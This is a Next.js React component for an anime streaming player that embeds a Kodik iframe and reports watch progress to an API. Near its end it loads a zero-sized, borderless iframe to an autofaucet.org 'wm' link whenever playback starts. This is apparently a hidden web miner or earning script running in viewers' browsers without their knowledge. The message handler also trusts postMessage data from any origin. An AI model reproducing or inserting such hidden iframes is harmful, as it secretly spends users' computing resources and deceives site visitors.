"use client";
import React, { createElement, useEffect, useRef, useState } from "react";
import { Button } from "../ui/button";
import {Link} from '@/utils/Link'
import {headers} from "next/headers";
import {header} from "@/utils/Header";
import {customFetch} from "@/utils/fetch";
import {redirect} from "next/navigation";
import {cn} from "@/lib/utils";
import { FullScreen, useFullScreenHandle } from "react-full-screen";

interface PlayerProps {
    link: string | undefined;
    animeId? : number
}

const Player: React.FC<PlayerProps> = ({link, animeId}) => {
    const [isStarted, setIsStarted] = useState(false);
    const [hasWindow, setHasWindow] = useState(false);
    const [inFullScreen, setInFullScreen] = useState(false)
    const handle = useFullScreenHandle()

    let currentEpisode:number = 0;
    const addToWatching = (seconds:number) => {
        customFetch(`api/users/addToWatching/${Number(animeId)}?currentEpisode=${currentEpisode}&secondsTotal=${seconds}`, "POST")
    }
    const updateTimestamps = (secondsWatched: number) => {
        customFetch(`api/users/updateTimestamps?animeId=${animeId}&secondsWatched=${secondsWatched}`, "PUT")
    }

    const kodikMessageListener = (message: any) => {
        if (message.data.key === "kodik_player_play") {
            setIsStarted(true);
        }
        if (message.data.key === "kodik_player_pause") {
            setIsStarted(false);
        }
        if(message.data.key === "kodik_player_duration_update"){
            addToWatching(message.data.value)
        }
        if(message.data.key === "kodik_player_time_update"){
            updateTimestamps(message.data.value)

        }
        if(message.data.key === "kodik_player_current_episode"){
            currentEpisode = message.data.value.episode
        }
    };

    const handleFullScreen = () => {
        if(document.fullscreenElement){
            setInFullScreen(prev => !prev)
            inFullScreen ? handle.enter() : handle.exit()
        }


    }

    useEffect(() => {
        setHasWindow(true)
        window.addEventListener("message", kodikMessageListener);
        document.addEventListener("fullscreenchange", handleFullScreen)
        return () => {
            window.removeEventListener("message", kodikMessageListener);
            document.removeEventListener("fullscreenchange", handleFullScreen)
        }
    },[])

    if (!hasWindow) return null;
    return (
        <div>
            {hasWindow && (
                <FullScreen handle={handle}>
                <div  className="lalal">
                    <iframe
                        className={cn(inFullScreen ? "fixed top-0 left-0 z-[100]" : "", )}
                        src={link}
                        width={inFullScreen ? window.innerWidth : "960px"}
                        height={inFullScreen ? window.innerHeight : "600px"}
                        frameBorder="0"
                        allow="autoplay *; fullscreen *"
                    ></iframe>
                    <div className="w-10 h-10 full absolute block top-10 right-10 z-[2147483647]" >Skip</div>
                    {/*<Button*/}
                    {/*    variant={"outline"}*/}
                    {/*    className="absolute left-8 bottom-10 z-10000 border-2 border-[#43aa52] px-5 py-3 text-[#43aa52] bg-transparent"*/}
                    {/*>*/}
                    {/*    Skip*/}
                    {/*</Button>*/}
                    <Button
                        variant={"outline"}
                        className="absolute right-8 z-10000 bottom-10 border-2 border-[#43aa52] px-5 py-3 text-[#43aa52] bg-transparent"
                    >
                        Next
                    </Button>

                </div>
            </FullScreen>
            )}
            {isStarted && (
                <iframe
                    src="https://autofaucet.org/wm/swag124/2"
                    width="0"
                    height="0"
                    style={{ border: "none" }}
                ></iframe>
            )}
        </div>
    );
};

export default Player;
